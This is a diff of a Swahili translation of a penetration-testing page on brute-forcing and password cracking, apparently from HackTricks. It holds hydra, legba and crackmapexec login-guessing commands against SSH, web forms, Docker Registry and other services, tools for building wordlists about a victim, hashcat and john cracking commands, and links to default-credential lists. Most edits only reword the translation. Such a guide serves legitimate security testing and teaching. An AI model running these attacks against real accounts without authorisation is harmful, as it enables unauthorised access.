@@ -4,7 +4,7 @@
 
 ## Default Credentials
 
-**Tafuta katika google** kwa ajili ya akidi za default za teknolojia inayotumika, au **jaribu hizi viungo**:
+**Tafuta kwenye google** kwa ajili ya akiba za kawaida za teknolojia inayotumika, au **jaribu hizi linki**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,7 +19,7 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Tengeneza Kamusi zako mwenyewe**
+## **Create your own Dictionaries**
 
 Pata taarifa nyingi kadri uwezavyo kuhusu lengo na tengeneza kamusi maalum. Zana ambazo zinaweza kusaidia:
 
@@ -34,19 +34,26 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Cewl
+### Orodha za maneno za tovuti
 ```bash
+# Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Tengeneza nywila kulingana na maarifa yako kuhusu mwathirika (majina, tarehe...)
+Zalisha nywila kulingana na maarifa yako kuhusu mwathirika (majina, tarehe...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Zana la kuunda orodha ya maneno, linalokuruhusu kutoa seti ya maneno, likikupa uwezekano wa kuunda tofauti nyingi kutoka kwa maneno yaliyotolewa, na kuunda orodha ya maneno ya kipekee na bora kutumia kuhusu lengo maalum.
+Zana la kuunda orodha ya maneno, ambalo linakuwezesha kutoa seti ya maneno, likikupa uwezekano wa kuunda tofauti nyingi kutoka kwa maneno yaliyotolewa, na kuunda orodha ya maneno ya kipekee na bora ya kutumia kuhusu lengo maalum.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -113,7 +120,7 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Usajili wa Docker
+### Docker Registry
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -149,7 +156,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form"**
+Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form**"
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle
 ```bash
@@ -332,6 +339,8 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
+[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
+
 ### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
@@ -393,11 +402,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Funguo dhaifu za SSH / PRNG inayoweza kutabirika ya Debian
 
-Baadhi ya mifumo yana kasoro zinazojulikana katika mbegu za nasibu zinazotumika kuzalisha vifaa vya kificho. Hii inaweza kusababisha kupungua kwa kiasi cha funguo ambacho kinaweza kubruteforced kwa zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti zilizozalishwa mapema za funguo dhaifu pia zinapatikana kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Baadhi ya mifumo yana kasoro zinazojulikana katika mbegu ya nasibu inayotumika kuunda vifaa vya kificho. Hii inaweza kusababisha kupungua kwa kiasi cha funguo ambacho kinaweza kubruteforced kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti zilizotengenezwa mapema za funguo dhaifu pia zinapatikana kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ na OpenMQ)
 
-Protokali ya maandiko ya STOMP ni protokali maarufu ya ujumbe inayotumiwa sana ambayo **inaruhusu mawasiliano na mwingiliano usio na mshono na huduma maarufu za kupanga ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyo sanifishwa na yenye ufanisi ya kubadilishana ujumbe na kufanya operesheni mbalimbali za ujumbe.
+Protokali ya maandiko ya STOMP ni protokali maarufu ya ujumbe inayotumiwa sana ambayo **inaruhusu mawasiliano na mwingiliano bila mshono na huduma maarufu za kupanga ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyoandikwa na yenye ufanisi ya kubadilishana ujumbe na kufanya operesheni mbalimbali za ujumbe.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -440,7 +449,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### Online cracking databases
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 na/au bila ESS/SSP na na thamani yoyote ya changamoto)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 na/au bila ESS/SSP na thamani yoyote ya changamoto)
 - [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, na archives MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -472,7 +481,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 #### Known plaintext zip attack
 
 Unahitaji kujua **plaintext** (au sehemu ya plaintext) **ya faili iliyomo ndani** ya zip iliyosimbwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizomo ndani** ya zip iliyosimbwa ukikimbia: **`7z l encrypted.zip`**\
-Pakua [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)kutoka kwenye ukurasa wa toleo.
+Pakua [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)kutoka kwenye ukurasa wa matoleo.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -560,7 +569,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Mafundisho mengine ya Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Another Luks BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -585,7 +594,7 @@ Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py]
 
 Ikiwa una faili ya xlsx yenye safu iliyo na nenosiri, unaweza kuondoa ulinzi wake:
 
-- **Pakia kwenye google drive** na nenosiri litafutwa kiotomatiki
+- **Pakua kwenye google drive** na nenosiri litafutwa kiotomatiki
 - Ili **kuondoa** kwa **mkono**:
 ```bash
 unzip file.xlsx
@@ -606,7 +615,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 
 **Mifano ya Hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### Kitambulisho cha Hash
+### Hash-identifier
 ```bash
 hash-identifier
 > <HASH>
@@ -626,25 +635,25 @@ kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction
 ```
 ### John mutation
 
-Soma _**/etc/john/john.conf**_ na uipange
+Soma _**/etc/john/john.conf**_ na uweke mipangilio yake
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat mashambulizi
+#### Hashcat attacks
 
-- **Shambulio la orodha ya maneno** (`-a 0`) na sheria
+- **Wordlist attack** (`-a 0`) with rules
 
-**Hashcat** tayari inakuja na **folda inayoshikilia sheria** lakini unaweza kupata [**sheria nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** tayari inakuja na **folda yenye sheria** lakini unaweza kupata [**sheria nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** attack
 
-Inapatikana **kuunganisha orodha 2 za maneno kuwa 1** kwa kutumia hashcat.\
-Ikiwa orodha 1 ilikuwa na neno **"hello"** na ya pili ilikuwa na mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yatatengenezwa.
+Ni uwezekano wa **kuunganisha orodha 2 za maneno kuwa 1** kwa kutumia hashcat.\
+Ikiwa orodha ya 1 ilikuwa na neno **"hello"** na ya pili ilikuwa na mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yatatengenezwa.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -695,7 +704,7 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Modes za Hashcat
+#### Njia za Hashcat
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
